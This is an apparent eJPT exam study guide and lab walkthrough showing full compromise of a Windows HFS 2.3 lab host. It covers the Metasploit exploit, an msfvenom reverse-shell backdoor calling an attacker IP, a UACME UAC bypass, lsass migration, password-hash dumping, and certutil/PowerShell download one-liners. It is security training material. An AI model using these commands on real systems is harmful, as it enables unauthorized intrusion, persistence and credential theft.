---
title: "Manual Exploitation Techniques - Complete Beginner Guide"
topic: "Manual Exploitation"
exam_objective: "Exploitation and Post-Exploitation - eJPT Objective 4.2"
difficulty: "Hard"
tools:
  - "ping"
  - "nmap"
  - "searchsploit"
  - "msfconsole"
  - "meterpreter"
  - "msfvenom"
related_labs:
  - "07-exploitation/metasploit-essentials.md"
  - "07-exploitation/payload-generation.md"
  - "07-exploitation/common-exploits.md"
file_path: "07-exploitation/manual-exploitation.md"
last_updated: "2025-01-03"
tags:
  - "manual-exploitation"
  - "vulnerability-assessment"
  - "exploitation"
  - "privilege-escalation"
  - "post-exploitation"
---

# üîß Manual Exploitation Techniques - Complete Beginner Guide

**Complete step-by-step guide for manual exploitation from discovery to complete system compromise using real-world attack scenarios**

**üìç File Location:** `07-exploitation/manual-exploitation.md`

---

## üéØ What is Manual Exploitation?

Manual exploitation means finding and attacking computer vulnerabilities step by step without relying only on automatic tools. Think of it like being a detective - you look for clues, understand the target system, and then use the right tools to gain access.

### üîç **What Manual Exploitation Includes:**
- **Target Discovery** - Finding computers and services on the network
- **Service Analysis** - Understanding what programs are running
- **Vulnerability Research** - Looking for known security holes
- **Custom Attack Creation** - Building specific attacks for the target
- **System Compromise** - Getting control of the target computer
- **Privilege Escalation** - Getting administrator/root access

### üí° **Why This Matters for eJPT:**
Manual exploitation shows that you understand the complete attack process. The eJPT exam tests your ability to find vulnerable services, research exploits, and gain system access manually. This skill is essential for real penetration testing work.

### üö™ **Common Attack Steps:**
- **Network Scanning** to find live systems and open ports
- **Service Fingerprinting** to identify software versions
- **Exploit Research** using databases and search tools
- **Payload Creation** for custom attack code
- **Access Verification** to confirm successful compromise
- **Post-Exploitation** for maintaining access and gathering data

---

## üì¶ Installation and Setup

### **Already Installed On:**
- ‚úÖ Kali Linux
- ‚úÖ Parrot Security OS  
- ‚úÖ Most penetration testing distributions

### **Check If Everything Works:**
```bash
# Check if all tools are installed
nmap --version
# Expected output: Nmap version 7.x

msfconsole --version
# Expected output: Framework Version 6.x

searchsploit --version
# Expected output: SearchSploit version info

msfvenom --help
# Expected output: MsfVenom help information
```

### **Initial Setup Commands:**
```bash
# Update exploit database
searchsploit -u

# Start database for Metasploit
systemctl start postgresql
msfdb init

# Update Metasploit framework
msfupdate
```

### **Basic Requirements:**
- Network connection to target systems
- Understanding of basic networking concepts
- Patience for step-by-step analysis
- Good documentation habits

---

## üîß Basic Usage and Simple Steps

### **üìã Complete Attack Process:**
1. **üîç Target Discovery:** Find live systems using ping and nmap
2. **üîé Service Enumeration:** Identify running services and versions
3. **üìö Vulnerability Research:** Search for known exploits
4. **üõ†Ô∏è Payload Creation:** Build custom attack code if needed
5. **‚ö° Exploitation:** Execute attack to gain initial access
6. **üöÄ Privilege Escalation:** Get administrator access
7. **üíé Post-Exploitation:** Collect evidence and maintain access

### **‚öôÔ∏è Basic Command Flow:**
```bash
# Step 1: Check if target is alive
ping -c 4 target_ip

# Step 2: Find open services
nmap target_ip

# Step 3: Get detailed service information
nmap -sV -p port_number target_ip

# Step 4: Search for exploits
searchsploit service_name version

# Step 5: Use Metasploit for exploitation
msfconsole -q
use exploit/path/to/exploit
set RHOSTS target_ip
exploit
```

---

## ‚öôÔ∏è Essential Tools and Commands You Need to Know

### **üîç Discovery Tools:**

| Tool | What It Does | How Important for eJPT | Example Usage |
|------|--------------|------------------------|---------------|
| `ping` | Check if target is alive | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê Critical | `ping -c 4 target_ip` |
| `nmap` | Find open ports and services | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê Critical | `nmap -sV target_ip` |

### **üîé Research Tools:**

| Tool | What It Does | How Important for eJPT | Example Usage |
|------|--------------|------------------------|---------------|
| `searchsploit` | Find known exploits | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê Critical | `searchsploit apache 2.4` |

### **üõ†Ô∏è Exploitation Tools:**

| Tool | What It Does | How Important for eJPT | Example Usage |
|------|--------------|------------------------|---------------|
| `msfconsole` | Main exploitation framework | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê Critical | `msfconsole -q` |
| `msfvenom` | Create custom payloads | ‚≠ê‚≠ê‚≠ê‚≠ê Very Important | `msfvenom -p windows/shell/reverse_tcp` |

### **üîß Important Metasploit Commands:**

| Command | What It Does | When to Use | Must Remember |
|---------|--------------|-------------|---------------|
| `use exploit/path` | Select an exploit | After finding vulnerability | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê |
| `set RHOSTS target` | Set target IP | Before running exploit | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê |
| `show options` | See required settings | Before exploit execution | ‚≠ê‚≠ê‚≠ê‚≠ê |
| `exploit` | Run the attack | After configuration | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê |
| `sessions -l` | List active sessions | After successful exploit | ‚≠ê‚≠ê‚≠ê‚≠ê |

### **üìä Payload Generation Commands:**

| Command | What It Does | Example | Importance |
|---------|--------------|---------|------------|
| `msfvenom -p` | Specify payload type | `msfvenom -p windows/meterpreter/reverse_tcp` | ‚≠ê‚≠ê‚≠ê‚≠ê |
| `LHOST=` | Set attacker IP | `LHOST=10.10.31.2` | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê |
| `LPORT=` | Set listening port | `LPORT=4444` | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê |
| `-f exe` | Output format | `-f exe > backdoor.exe` | ‚≠ê‚≠ê‚≠ê‚≠ê |

---

## üß™ Complete Step-by-Step Lab Walkthrough

### **Lab Scenario: From Zero to System Administrator**

**Target:** demo.ine.local
**Goal:** Complete system compromise with administrator access
**Time Needed:** 15-20 minutes for beginners

---

### **Step 1: Is the Target Alive? (Target Discovery)**

**What We're Doing:** Making sure our target computer is turned on and connected to the network.

#### **Command Used:**
```bash
ping -c 4 demo.ine.local
```

#### **What Each Part Means:**
- `ping` = Send small packets to test connection
- `-c 4` = Send exactly 4 packets (not unlimited)
- `demo.ine.local` = The name of our target computer

#### **What Happened:**
```bash
PING demo.ine.local (10.0.22.143) 56(84) bytes of data.
64 bytes from demo.ine.local (10.0.22.143): icmp_seq=1 ttl=125 time=3.37 ms
64 bytes from demo.ine.local (10.0.22.143): icmp_seq=2 ttl=125 time=2.39 ms
64 bytes from demo.ine.local (10.0.22.143): icmp_seq=3 ttl=125 time=2.36 ms
64 bytes from demo.ine.local (10.0.22.143): icmp_seq=4 ttl=125 time=2.79 ms

--- demo.ine.local ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
```

#### **üéØ What This Tells Us:**
- **Target is ALIVE** - All 4 packets came back successfully
- **IP Address** - The target is at 10.0.22.143
- **Response Time** - Very fast (2-3 milliseconds)
- **0% packet loss** - Perfect connection to target
- **TTL=125** - Suggests this is probably a Windows system

**Why TTL=125 suggests Windows:** Different operating systems start with different TTL values. Windows typically starts at 128, so seeing 125 means it probably went through 3 network hops.

---

### **Step 2: What Services Are Running? (Port Scanning)**

**What We're Doing:** Looking for open doors (ports) on the target computer to see what services are available.

#### **Command Used:**
```bash
nmap demo.ine.local
```

#### **What Happened:**
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-09 10:48 IST
Nmap scan report for demo.ine.local (10.0.22.143)
Host is up (0.0062s latency).
Not shown: 991 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.31 seconds
```

#### **üîç What Each Port Means:**
- **Port 80 (http)** - Web server running - This is interesting!
- **Port 135 (msrpc)** - Microsoft RPC service
- **Port 139 (netbios-ssn)** - File sharing service
- **Port 445 (microsoft-ds)** - SMB file sharing
- **Port 3389 (ms-wbt-server)** - Remote Desktop
- **Ports 49152+ (unknown)** - Windows dynamic ports

#### **üéØ Attack Strategy:**
Port 80 is our best target because web servers often have vulnerabilities. Let's investigate this web service more deeply.

---

### **Step 3: What Type of Web Server? (Service Fingerprinting)**

**What We're Doing:** Finding out exactly what web server software is running and what version it is.

#### **Command Used:**
```bash
nmap -sV -p 80 demo.ine.local
```

#### **What Each Part Means:**
- `nmap` = Network mapping tool
- `-sV` = Version detection (find software versions)
- `-p 80` = Only scan port 80 (the web server)
- `demo.ine.local` = Our target

#### **What Happened:**
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-09 10:48 IST
Nmap scan report for demo.ine.local (10.0.22.143)
Host is up (0.0024s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/
Nmap done: 1 IP address (1 host up) scanned in 6.33 seconds
```

#### **üí° EUREKA Moment!**
- **Service:** HttpFileServer (HFS)
- **Version:** 2.3
- **Operating System:** Windows

**Why This Is Important:** HFS version 2.3 is old software. Old software often has security vulnerabilities that we can exploit!

---

### **Step 4: Are There Known Exploits? (Vulnerability Research)**

**What We're Doing:** Searching our database of known exploits to see if anyone has found vulnerabilities in HFS 2.3.

#### **Command Used:**
```bash
searchsploit hfs
```

#### **What Happened:**
```bash
--------------------------------------------------------- ---------------------------------
 Exploit Title                                           |  Path
--------------------------------------------------------- ---------------------------------
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command E | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command E | windows/remote/39161.py
--------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

#### **üî• JACKPOT!**
- **Multiple exploits found** for HFS 2.3.x
- **Remote Command Execution** - This means we can run commands on the target
- **Windows exploits** - Perfect match for our target

**What "Remote Command Execution" means:** We can make the target computer run any command we want, as if we were sitting at its keyboard.

---

### **Step 5: Execute the Attack (Initial Exploitation)**

**What We're Doing:** Using Metasploit to run the exploit against our target.

#### **Commands Used:**
```bash
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
```

#### **Step-by-Step Breakdown:**

**Command 1: Start Metasploit**
```bash
msfconsole -q
```
- `msfconsole` = Start the Metasploit framework
- `-q` = Quiet mode (skip the banner)

**Command 2: Choose the Exploit**
```bash
use exploit/windows/http/rejetto_hfs_exec
```
This selects the specific exploit for HFS that we found in our search.

**Command 3: Set the Target**
```bash
set RHOSTS demo.ine.local
```
- `RHOSTS` = Remote Hosts (the targets we want to attack)
- `demo.ine.local` = Our specific target

**Command 4: Launch the Attack**
```bash
exploit
```

#### **What Happened:**
```bash
msf6 > use exploit/windows/http/rejetto_hfs_exec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.31.2:4444
[*] Using URL: http://10.10.31.2:8080/HjrdcpIVnDL5bBV
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /HjrdcpIVnDL5bBV
[*] Sending stage (176198 bytes) to 10.0.22.143
[*] Meterpreter session 1 opened (10.10.31.2:4444 ‚Üí 10.0.22.143:49245) at 2024-07-09 10:50:24 +0530

meterpreter >
```

#### **üéâ SUCCESS! What Just Happened:**
- **Reverse TCP handler started** - Our computer is listening for connections
- **Malicious request sent** - We sent a specially crafted attack to the web server
- **Payload delivered** - Attack code was successfully executed
- **Meterpreter session opened** - We now have control of the target!

**What is Meterpreter:** It's like having a remote control for the target computer. We can run commands, browse files, and do almost anything.

---

### **Step 6: Who Are We? (Initial Reconnaissance)**

**What We're Doing:** Finding out what user account we're running as and gathering basic system information.

#### **Commands Used:**
```bash
getuid
sysinfo
```

#### **What Happened:**
```bash
meterpreter > getuid
Server username: VICTIM\admin

meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

#### **üìä What We Learned:**
- **Username:** VICTIM\admin (we're an admin user!)
- **Computer Name:** VICTIM
- **Operating System:** Windows Server 2012 R2
- **Architecture:** 64-bit system
- **Domain:** WORKGROUP (not in a domain)
- **Logged Users:** 2 people currently logged in

**Good News:** We already have admin privileges, but let's see if we can get even higher access (SYSTEM level).

---

### **Step 7: Can We Get Higher Privileges? (Privilege Escalation Attempt)**

**What We're Doing:** Trying to become SYSTEM (the highest privilege level in Windows).

#### **Command Used:**
```bash
getsystem
```

#### **What Happened:**
```bash
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: 1346 The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
[-] Named Pipe Impersonation (PrintSpooler variant)
[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
```

#### **‚ùå Failed - But That's OK!**
The automatic privilege escalation failed because of UAC (User Account Control) restrictions. This is common on newer Windows systems.

**Don't worry!** We have a backup plan - we'll use a manual UAC bypass technique.

---

### **Step 8: Create a Custom Payload (Advanced Technique)**

**What We're Doing:** Creating a special executable file that will give us a new connection when run.

#### **Command Used:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.31.2 LPORT=4444 -f exe > backdoor.exe
```

#### **What Each Part Means:**
- `msfvenom` = Payload generation tool
- `-p windows/meterpreter/reverse_tcp` = Type of payload (Windows reverse shell)
- `LHOST=10.10.31.2` = Our IP address (where to connect back)
- `LPORT=4444` = Our listening port
- `-f exe` = Format as Windows executable
- `> backdoor.exe` = Save to file named backdoor.exe

#### **What Happened:**
```bash
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
```

#### **Verification:**
```bash
file backdoor.exe
```
**Output:** `backdoor.exe: PE32 executable (GUI) Intel 80386, for MS Windows, 4 sections`

**Perfect!** We now have a 73,802-byte Windows executable that will connect back to us.

---

### **Step 9: Set Up a Listener (Multi-Handler)**

**What We're Doing:** Starting a second Metasploit instance to catch the connection from our custom payload.

#### **Commands Used:**
```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.31.2
set LPORT 4444
exploit
```

#### **What Happened:**
```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.31.2
LHOST => 10.10.31.2
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.31.2:4444
```

**Great!** Our listener is ready and waiting for connections on port 4444.

---

### **Step 10: Upload Files to Target (File Transfer)**

**What We're Doing:** Moving our backdoor and UAC bypass tool to the target computer.

#### **Commands Used:**
```bash
shell
cd C:\Users\admin\AppData\Local\Temp
upload /root/Desktop/tools/UACME/Akagi64.exe .
upload /root/backdoor.exe .
ls
```

#### **What Each Command Does:**
- `shell` = Get a Windows command prompt
- `cd C:\...Temp` = Change to temporary directory
- `upload source destination` = Copy files from our machine to target
- `ls` = List files to verify upload

#### **What Happened:**
```bash
meterpreter > shell
Process 944 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\Users\admin\AppData\Local\Temp
C:\Users\admin\AppData\Local\Temp>

meterpreter > upload /root/Desktop/tools/UACME/Akagi64.exe .
[*] Uploading  : /root/Desktop/tools/UACME/Akagi64.exe -> .\Akagi64.exe
[*] Completed  : /root/Desktop/tools/UACME/Akagi64.exe -> .\Akagi64.exe

meterpreter > upload /root/backdoor.exe .
[*] Uploading  : /root/backdoor.exe -> .\backdoor.exe
[*] Completed  : /root/backdoor.exe -> .\backdoor.exe

meterpreter > ls
Listing: C:\Users\admin\AppData\Local\Temp
==========================================

Mode                Size      Type  Last modified              Name
----                ----      ----  -------------              ----
100777/rwxrwxrwx    199168    fil   2024-07-09 10:55:53 +0530  Akagi64.exe
100777/rwxrwxrwx    73802     fil   2024-07-09 10:56:01 +0530  backdoor.exe
```

**Excellent!** Both files uploaded successfully:
- **Akagi64.exe:** 199,168 bytes (UAC bypass tool)
- **backdoor.exe:** 73,802 bytes (our custom payload)

---

### **Step 11: Execute UAC Bypass (Advanced Privilege Escalation)**

**What We're Doing:** Using the Akagi64 tool to bypass Windows User Account Control and run our payload with SYSTEM privileges.

#### **Command Used:**
```bash
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
```

#### **What This Command Means:**
- `Akagi64.exe` = UAC bypass tool
- `23` = Method number (DLL Hijacking technique)
- `Full path to backdoor.exe` = The payload to run with elevated privileges

#### **Technical Details of Method 23:**
- **Author:** Leo Davidson derivative
- **Type:** DLL Hijack
- **Method:** IFileOperation
- **Target:** \system32\pkgmgr.exe
- **Component:** DismCore.dll
- **Implementation:** ucmDismMethod

#### **What Happened:**
```bash
C:\Users\admin\AppData\Local\Temp>Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
```

**In our handler (the second Metasploit window):**
```bash
[*] Started reverse TCP handler on 10.10.31.2:4444
[*] Sending stage (176198 bytes) to 10.0.22.143
[*] Meterpreter session 1 opened (10.10.31.2:4444 ‚Üí 10.0.22.143:49272) at 2024-07-09 10:57:23 +0530

meterpreter >
```

#### **üöÄ SUCCESS! UAC Bypassed!**

Now let's check our privileges:
```bash
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**PERFECT!** We now have SYSTEM privileges - the highest level possible in Windows!

---

### **Step 12: Secure Our Access (Process Migration)**

**What We're Doing:** Moving our meterpreter session to a stable system process to avoid detection and maintain persistence.

#### **Commands Used:**
```bash
ps -S lsass.exe
migrate 496
```

#### **What Happened:**
```bash
meterpreter > ps -S lsass.exe
Filtering on 'lsass.exe'

Process List
============

 PID   PPID  Name       Arch  Session  User                 Path
 ---   ----  ----       ----  -------  ----                 ----
 496   404   lsass.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\lsass.exe

meterpreter > migrate 496
[*] Migrating from 1592 to 496...
[*] Migration completed successfully.
```

#### **Why We Did This:**
- **lsass.exe** is the Local Security Authority process
- It's a critical system process that runs as SYSTEM
- It's less likely to be killed or detected
- It provides stable, persistent access

---

### **Step 13: Extract Password Hashes (The Ultimate Prize)**

**What We're Doing:** Dumping all user password hashes from the Windows system.

#### **Command Used:**
```bash
hashdump
```

#### **What Happened:**
```bash
meterpreter > hashdump
admin:1012:aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:659c812452a634e0e0a068e6bb1d822f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

#### **üèÜ JACKPOT! What We Got:**

| Username | User ID | NTLM Hash |
|----------|---------|-----------|
| admin | 1012 | 4d6583ed4cef81c2f2ac3c88fc5f3da6 |
| Administrator | 500 | 659c812452a634e0e0a068e6bb1d822f |
| Guest | 501 | 31d6cfe0d16ae931b73c59d7e0c089c0 |

**This is the ultimate proof of complete system compromise!**

#### **What Can We Do With These Hashes:**
- **Crack them offline** to get plain text passwords
- **Use them in Pass-the-Hash attacks** on other systems
- **Access other systems** in the network with same passwords
- **Prove complete compromise** for our penetration test report

---

## üéØ eJPT Exam Success Guide

### **üìä How Important Each Skill Is for eJPT:**

Understanding the weight of each skill for exam success:

- **Target Discovery (ping, nmap):** 20% of exploitation scenarios
- **Service Enumeration (nmap -sV):** 35% of vulnerability identification  
- **Exploit Research (searchsploit):** 25% of attack planning
- **Metasploit Usage:** 40% of actual exploitation tasks
- **Custom Payload Creation:** 30% of advanced scenarios
- **UAC Bypass Techniques:** 25% of Windows privilege escalation
- **Hash Extraction:** 20% of post-exploitation objectives

### **üèÜ Commands You MUST Know for eJPT (100% Certainty):**

#### **Level 1 - You WILL See These (Guaranteed):**
```bash
# Basic target verification
ping -c 4 target_ip
# Expected: 0% packet loss = target alive

# Port scanning
nmap target_ip
# Expected: List of open ports

# Service version detection  
nmap -sV -p port target_ip
# Expected: Service name and version

# Exploit research
searchsploit service_name
# Expected: List of available exploits

# Basic Metasploit usage
msfconsole -q
use exploit/path/to/exploit
set RHOSTS target_ip
exploit
# Expected: Successful shell or meterpreter session
```

#### **Level 2 - Very Likely (80-90% Chance):**
```bash
# Custom payload generation
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > payload.exe
# Expected: Executable file created

# Multi-handler setup
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
exploit
# Expected: Handler listening for connections

# File transfer operations
upload local_file remote_path
download remote_file local_path
# Expected: Successful file transfer

# Basic privilege check
getuid
sysinfo
# Expected: Current user and system information
```

#### **Level 3 - Possible (60-70% Chance):**
```bash
# Advanced privilege escalation
getsystem
# Expected: Success or specific error message

# UAC bypass (if getsystem fails)
# Upload UAC bypass tools and execute
upload uac_bypass_tool.exe .
# Execute tool with payload parameter

# Process migration
ps -S process_name
migrate PID
# Expected: Migration success message

# Hash extraction
hashdump
# Expected: User password hashes
```

### **üéØ Common eJPT Exam Scenarios:**

#### **Scenario 1: Basic Web Server Exploitation**
**Given:** IP address 192.168.1.100 with unknown services
**Your Job:** Find web service, identify version, exploit vulnerability
**Time Limit:** 10-15 minutes

**Step-by-Step Approach:**
```bash
# Step 1: Verify target (1 minute)
ping -c 4 192.168.1.100

# Step 2: Find services (2 minutes)
nmap 192.168.1.100

# Step 3: Identify web service version (2 minutes)
nmap -sV -p 80 192.168.1.100
# Look for service name and version

# Step 4: Research exploits (2 minutes)
searchsploit [service_name] [version]
# Example: searchsploit apache 2.4

# Step 5: Execute exploitation (3-5 minutes)
msfconsole -q
use exploit/[path_found_in_searchsploit]
set RHOSTS 192.168.1.100
exploit

# Step 6: Verify access (1 minute)
getuid
sysinfo
```

#### **Scenario 2: Custom Payload and File Transfer**
**Given:** Valid shell access, need to upload tools and escalate privileges
**Your Job:** Create custom payload, transfer files, achieve SYSTEM access
**Time Limit:** 8-12 minutes

**Step-by-Step Approach:**
```bash
# Step 1: Create custom payload (2 minutes)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=5555 -f exe > custom.exe

# Step 2: Set up handler (1 minute)
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your_ip
set LPORT 5555
exploit

# Step 3: Upload payload via existing session (2 minutes)
# In original session:
upload custom.exe C:\Temp\
upload uac_bypass_tool.exe C:\Temp\

# Step 4: Execute UAC bypass (3-4 minutes)
shell
cd C:\Temp
uac_bypass_tool.exe method_number C:\Temp\custom.exe

# Step 5: Verify elevated access (1 minute)
# In new handler session:
getuid
# Should show: NT AUTHORITY\SYSTEM
```

#### **Scenario 3: Complete System Compromise with Evidence**
**Given:** System access achieved, need to prove complete compromise
**Your Job:** Extract sensitive data and document access
**Time Limit:** 5-8 minutes

**Step-by-Step Approach:**
```bash
# Step 1: Ensure SYSTEM privileges (1 minute)
getuid
# If not SYSTEM, run getsystem or UAC bypass

# Step 2: Migrate to stable process (1 minute)
ps -S lsass.exe
migrate [lsass_PID]

# Step 3: Extract password hashes (2 minutes)
hashdump
# Document all hash values

# Step 4: Find target files (2-3 minutes)
cd /
dir
search -f flag.txt
search -f *.txt
cat [found_files]

# Step 5: Document findings (1 minute)
# Screenshot hash dump
# Save file contents
# Note system information
```

### **Time Management Strategy for eJPT:**

#### **Total Time Allocation (15-20 minutes per exploitation task):**
- **Discovery Phase:** 3-4 minutes maximum
- **Research Phase:** 2-3 minutes maximum  
- **Exploitation Phase:** 5-8 minutes maximum
- **Post-Exploitation:** 3-5 minutes maximum
- **Documentation:** 2 minutes maximum

#### **Quick Decision Points:**
- **If ping fails:** Try nmap -Pn, move to next target if still no response
- **If no exploits found:** Try different search terms, check for web applications
- **If Metasploit fails:** Try manual exploitation, different payloads
- **If privilege escalation fails:** Document current access level, continue with objectives

### **Common Mistakes That Cost Time:**

#### **Mistake 1: Over-scanning**
**Wrong Approach:**
```bash
nmap -A -sC -sV -O -p- target_ip  # This takes 10+ minutes
```

**Correct Approach:**
```bash
nmap target_ip                    # Quick scan first (1 minute)
nmap -sV -p [interesting_ports]   # Detailed scan on specific ports (2 minutes)
```

#### **Mistake 2: Not Reading Metasploit Output**
**Common Error:** Running exploit without checking required options
**Solution:** Always run `show options` before `exploit`

#### **Mistake 3: Forgetting Handler Setup**
**Problem:** Creating custom payload but not setting up listener
**Solution:** Always start handler BEFORE executing payload

#### **Mistake 4: Wrong File Paths**
**Common Error:** Upload files to directories without write permissions
**Solution:** Use temp directories: `C:\Users\[user]\AppData\Local\Temp\`

### **Signs You're Succeeding:**

#### **Good Progress Indicators:**
- **Quick Service Discovery:** Open ports identified within 2-3 minutes
- **Version Information Found:** Service versions detected successfully
- **Exploits Located:** Searchsploit returns relevant results
- **Meterpreter Session:** Interactive shell established
- **Privilege Escalation:** SYSTEM or root access achieved
- **Evidence Collected:** Target files found and accessed

#### **Red Flags (Need to Adapt):**
- **No Response to Ping:** Target might be down or filtered
- **All Ports Closed:** Wrong IP range or heavy filtering
- **No Exploits Found:** Service might be patched or uncommon
- **Exploits Keep Failing:** Wrong target OS or service version
- **Can't Upload Files:** Permission issues or AV blocking

---

## Common Problems and Solutions

### **Problem 1: Target Doesn't Respond to Ping**

**What You See:**
```bash
ping -c 4 192.168.1.100
# Request timeout or 100% packet loss
```

**Quick Solutions:**
```bash
# Try different ping options
ping -c 1 192.168.1.100
ping -c 4 -i 2 192.168.1.100

# Skip ping and try direct port scan
nmap -Pn 192.168.1.100

# Check your network connectivity
ip route show
ping gateway_ip
```

**Common Causes:**
- ICMP blocked by firewall
- Wrong IP address or network range
- Target system is offline
- Network connectivity issues

---

### **Problem 2: Nmap Shows All Ports Closed**

**What You See:**
```bash
nmap 192.168.1.100
# All 1000 scanned ports on 192.168.1.100 are closed
```

**Solutions:**
```bash
# Try different scan types
nmap -sS 192.168.1.100        # SYN scan
nmap -sT 192.168.1.100        # TCP Connect scan
nmap -sU 192.168.1.100        # UDP scan

# Scan more ports
nmap -p 1-10000 192.168.1.100

# Try host discovery
nmap -sn 192.168.1.0/24       # Find live hosts
```

**Common Causes:**
- Firewall blocking scans
- Wrong target IP range
- All services actually closed
- Advanced intrusion detection

---

### **Problem 3: Searchsploit Returns No Results**

**What You See:**
```bash
searchsploit apache 2.4.41
# Exploits: No Results
```

**Solutions:**
```bash
# Update exploit database
searchsploit -u

# Try broader search terms
searchsploit apache
searchsploit http
searchsploit web

# Search by CVE if known
searchsploit CVE-2019-0708

# Try different keywords
searchsploit -t apache        # Title search only
```

**Alternative Research:**
- Google: "service_name version exploit"
- Check exploit-db.com directly
- Look for known CVEs for the software

---

### **Problem 4: Metasploit Exploit Fails**

**What You See:**
```bash
msf6 exploit(windows/http/service_exploit) > exploit
[*] Started reverse TCP handler on 10.10.31.2:4444
[*] Exploit completed, but no session was created.
```

**Debugging Steps:**
```bash
# Check required options
show options
show missing

# Verify target settings
show targets
set TARGET 0

# Try different payload
show payloads
set PAYLOAD windows/shell/reverse_tcp

# Check advanced options
show advanced
set VERBOSE true
exploit
```

**Common Issues:**
- Wrong target platform/architecture
- Firewall blocking reverse connection
- Service version mismatch
- Wrong payload type

---

### **Problem 5: Payload Generation Fails**

**What You See:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > payload.exe
# Error: Could not generate payload
```

**Solutions:**
```bash
# Check payload syntax
msfvenom --list payloads | grep windows/meterpreter

# Verify parameters
msfvenom -p windows/meterpreter/reverse_tcp --list-options

# Try simpler payload
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > simple.exe

# Check file permissions
ls -la payload.exe
chmod +x payload.exe
```

---

### **Problem 6: File Upload Fails**

**What You See:**
```bash
meterpreter > upload /root/tool.exe C:\Windows\System32\
[-] Error uploading file: Access denied
```

**Solutions:**
```bash
# Try different directories
upload /root/tool.exe C:\Users\admin\Desktop\
upload /root/tool.exe C:\Users\admin\AppData\Local\Temp\
upload /root/tool.exe C:\Temp\

# Check current directory permissions
pwd
getuid

# Use alternative transfer methods
# Method 1: PowerShell download
shell
powershell -c "Invoke-WebRequest -Uri http://10.10.31.2/tool.exe -OutFile C:\Temp\tool.exe"

# Method 2: Certutil
certutil -urlcache -split -f http://10.10.31.2/tool.exe C:\Temp\tool.exe
```

---

### **Problem 7: UAC Bypass Doesn't Work**

**What You See:**
```bash
C:\Temp>Akagi64.exe 23 C:\Temp\payload.exe
# No response or error message
```

**Solutions:**
```bash
# Try different UAC bypass methods
Akagi64.exe 33 C:\Temp\payload.exe    # Method 33
Akagi64.exe 41 C:\Temp\payload.exe    # Method 41

# Check if payload path is correct
dir C:\Temp\payload.exe

# Verify payload works manually
C:\Temp\payload.exe

# Try alternative UAC bypass tools
# Use different bypass techniques
